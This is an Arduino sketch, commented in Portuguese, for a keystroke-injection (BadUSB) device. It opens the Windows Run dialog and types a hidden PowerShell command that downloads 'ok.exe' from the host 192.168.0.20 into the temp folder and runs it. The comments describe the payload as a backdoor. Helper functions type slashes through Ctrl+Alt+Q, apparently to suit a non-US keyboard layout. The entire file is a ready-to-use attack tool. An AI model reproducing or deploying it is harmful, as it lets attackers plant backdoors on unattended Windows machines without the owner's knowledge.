#include "Keyboard.h"
/*função de pressionar, que servirá para nossa tecla enter.*/
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
/*função para digitar / */
void bar(){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('q');
  Keyboard.releaseAll();
}
void setup() {
  /*iniciando*/
  Keyboard.begin();
  
  delay(5000);
  /*junção da tecla Windows+R*/
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  
  delay(500);
  /*Inserção de códigos no windows + R, para download e execução do backdoor.*/
  Keyboard.print("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(`http?");
  bar();
  bar();
  Keyboard.print("192.168.0.20");
  bar();
  Keyboard.print("ok.exe`,`%TEMP%");
  bar();
  Keyboard.print("ok.exe`)/ Start-Process ~%TEMP%");
  bar();
  Keyboard.print("ok.exe~");
  delay(500);
  /*acionando enter*/
  typeKey(KEY_RETURN);
  /*acabando*/
  Keyboard.end();
}
void loop(){
}
